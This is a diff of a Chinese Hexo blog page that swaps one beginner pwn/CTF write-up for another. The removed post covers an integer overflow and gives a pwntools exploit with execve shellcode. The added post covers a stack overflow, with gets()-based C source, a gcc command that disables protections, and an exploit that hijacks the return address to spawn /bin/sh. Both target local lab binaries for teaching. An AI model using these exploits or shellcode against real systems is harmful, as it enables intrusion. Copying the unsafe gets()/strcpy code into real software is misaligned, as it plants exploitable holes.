@@ -6,25 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>PWN | Hexo</title>
+  <title>PWN0 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="记录每天的进步，只有努力不会背叛自己！ PWN从开始到开始–整数溢出">
+  <meta name="description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN 基于无保护栈溢出——控制流劫持">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PWN">
+<meta property="og:title" content="PWN0">
 <meta property="og:url" content="http://yoursite.com/2017/09/18/pwn0/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！ PWN从开始到开始–整数溢出">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnx80zkt7j30fq07aaa0.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnyh9bq2aj30np07yq3j.jpg">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/006rgqhqgy1fjnyk5kgi5j30op06uq45.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnyn32vutj30dc03nt8v.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnyz0rjcdj30q605j0tb.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnzf4p7wfj30kt07gmy3.jpg">
-<meta property="og:updated_time" content="2017-09-18T14:25:53.092Z">
+<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN 基于无保护栈溢出——控制流劫持">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006rgqhqgy1fjp0dswpxmj30a4049q2q.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006rgqhqgy1fjp0gjcua3j30fe05xq41.jpg">
+<meta property="og:updated_time" content="2017-09-19T09:50:07.941Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PWN">
-<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！ PWN从开始到开始–整数溢出">
-<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnx80zkt7j30fq07aaa0.jpg">
+<meta name="twitter:title" content="PWN0">
+<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN 基于无保护栈溢出——控制流劫持">
+<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/006rgqhqgy1fjp0dswpxmj30a4049q2q.jpg">
   
   
     <link rel="icon" href="/favicon.png">
@@ -173,7 +169,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      PWN
+      PWN0
     </h1>
   
 
@@ -186,17 +182,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>记录每天的进步，只有努力不会背叛自己！</p>
-<h1 id="PWN从开始到开始–整数溢出"><a href="#PWN从开始到开始–整数溢出" class="headerlink" title="PWN从开始到开始–整数溢出"></a>PWN从开始到开始–整数溢出</h1><a id="more"></a>
-<h2 id="1、整数溢出"><a href="#1、整数溢出" class="headerlink" title="1、整数溢出"></a>1、整数溢出</h2><p>整数溢出就是往存储整数的内存单位存放的数据大于该内存单位所能存储的最大值,整数溢出有时候间接导致缓冲区溢出。</p>
-<h2 id="2、题目-全球某工商的ctf网站上的ctf题（还有源码福利）"><a href="#2、题目-全球某工商的ctf网站上的ctf题（还有源码福利）" class="headerlink" title="2、题目-全球某工商的ctf网站上的ctf题（还有源码福利）"></a>2、题目-全球某工商的ctf网站上的ctf题（还有源码福利）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include</span></div><div class="line"><span class="comment">#include</span></div><div class="line"><span class="comment">#include</span></div><div class="line">void flow(char* input)&#123;</div><div class="line">	char passwd_buf[11];</div><div class="line">	unsigned char passwd_len = strlen(input);</div><div class="line">	<span class="keyword">if</span>(passwd_len&gt;=4&amp;&amp;passwd_len&lt;=8)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Valid Password\n"</span>);</div><div class="line">		strcpy(passwd_buf,input);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Invalid Password\n"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char input[1024];</div><div class="line">	gets(input);</div><div class="line">	flow(input);</div><div class="line">	<span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>   先file pwn0,发现为32位,checksec pwn0并且没有开NX,用ida打开，如下<br>   <img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnx80zkt7j30fq07aaa0.jpg" alt=""><br>   发现栈空间为14h,这里是无符号接受判断输入的字符个数，也就是当超过256,个字符又会循环。即257为1，根据题目<br>   判断输入字符4~8个，即261=5，构造261位，既可以绕过检测，又为我们提供了栈空间</p>
-<p>   由于已经知道那个函数的栈空间14h,那么函数的返回地址即为18h,但是我们的shellcode是大于18h的，所以放在18h的后面，payload如下：<br>   <code>payload =&#39;a&#39;*24 + ret + shellcode</code></p>
-<p>   现在我们找到ret的地址，即是shellcode的起始地址（shellcode可以自己生成），这我…一言难尽<br>   <img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnyh9bq2aj30np07yq3j.jpg" alt=""><br>   调试，找到shellcode的起始地址<br>   <img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fjnyk5kgi5j30op06uq45.jpg" alt=""><br>   改变返回地址<br>   ret = 0xffffcf80<br>   运行<br>   <img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnyn32vutj30dc03nt8v.jpg" alt=""><br>   成功！<br>   然而，并没有做过pwn题的我来说，我就直接运行，悲剧发生了</p>
-<p>   原来要在本地跑运行，然后 核心转存，用生成的coredump来调试<br>   核心转存配置：<br>   <img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnyz0rjcdj30q605j0tb.jpg" alt=""></p>
-<p>   本地运行：<br>   <code>socat tcp-l:4000,fork exec:./pwn0</code></p>
-<p>   本地生成core.pwn0.2684文件,调试core.pwn0.2684文件<br>   <code>gdb pwn0 core.pwn0.2684</code><br>   如图：<br>   <img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnzf4p7wfj30kt07gmy3.jpg" alt=""></p>
-<p>   运行成功<br>   exp:<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">  from pwn import *</div><div class="line"></div><div class="line">shellcode = <span class="string">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</span>;</div><div class="line"></div><div class="line">p = remote(<span class="string">'127.0.0.1'</span>,4000)</div><div class="line"><span class="comment">#p = process('./pwn0')</span></div><div class="line">ret = 0xffffced0</div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line"></div><div class="line">payload = <span class="string">'b'</span>*24+p32(ret)+shellcode+<span class="string">'a'</span>*(261-28-len(shellcode))</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+        <p>记录每天的进步，只有努力不会背叛自己！每天学习一点PWN</p>
+<h1 id="基于无保护栈溢出——控制流劫持"><a href="#基于无保护栈溢出——控制流劫持" class="headerlink" title="基于无保护栈溢出——控制流劫持"></a>基于无保护栈溢出——控制流劫持</h1><a id="more"></a>
+<h2 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h2><p>通过覆盖返回地址，让程序执行我们想要执行的位置（任意地址）,包括我们构造的shellcode，从而得到shell<br>换个姿势理解： <a href="https://esebanana.github.io/2017/09/14/window-hexo/" target="_blank" rel="external">https://esebanana.github.io/2017/09/14/window-hexo/</a></p>
+<h2 id="2、源码福利"><a href="#2、源码福利" class="headerlink" title="2、源码福利"></a>2、源码福利</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;string.h&gt;</span></div><div class="line">void <span class="function"><span class="title">success</span></span>() &#123;</div><div class="line">puts(<span class="string">"You Hava already controlled it."</span>);</div><div class="line">system(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void <span class="function"><span class="title">vulnerable</span></span>() &#123;</div><div class="line">char s[12];</div><div class="line">gets(s);</div><div class="line">puts(s);</div><div class="line"><span class="built_in">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv) &#123;</div><div class="line">vulnerable();</div><div class="line"><span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="3、命令编译程序生成stack1-exe文件"><a href="#3、命令编译程序生成stack1-exe文件" class="headerlink" title="3、命令编译程序生成stack1.exe文件"></a>3、命令编译程序生成stack1.exe文件</h2><p><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o stack1 stack1.c</code><br>-no-pie会关掉PIE,-fno-stack-protector和-z execstack这两个参数会分别关掉Stack Protector和NX</p>
+<h2 id="4、分析"><a href="#4、分析" class="headerlink" title="4、分析"></a>4、分析</h2><p>使用ida打开，发现如下:<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjp0dswpxmj30a4049q2q.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjp0gjcua3j30fe05xq41.jpg" alt=""></p>
+<p>这里就可以覆盖返回地址构造溢出</p>
+<h2 id="5、写exp"><a href="#5、写exp" class="headerlink" title="5、写exp"></a>5、写exp</h2><p>这里可以安装pwntools，这是一个很好用的工具<br><code>git clone https://github.com/Gallopsled/pwntools</code><br><code>cd pwntools</code><br><code>python setup.py install</code><br>调试可以用gdb,可以安装插件peda<br><code>git clone https://github.com/longld/peda.git ~/peda</code><br><code>echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</code></p>
+<p>exp:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">p = process(<span class="string">'./stack1'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'A'</span>*24 + p32(0x804846B)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
 
       
 
@@ -305,7 +299,7 @@
     </a>
   
   
-    <a href="/2017/09/14/window-hexo/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2017/09/14/pwn00/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">基于绕过密码检测</div>
       <i class="icon-circle-right"></i>
     </a>
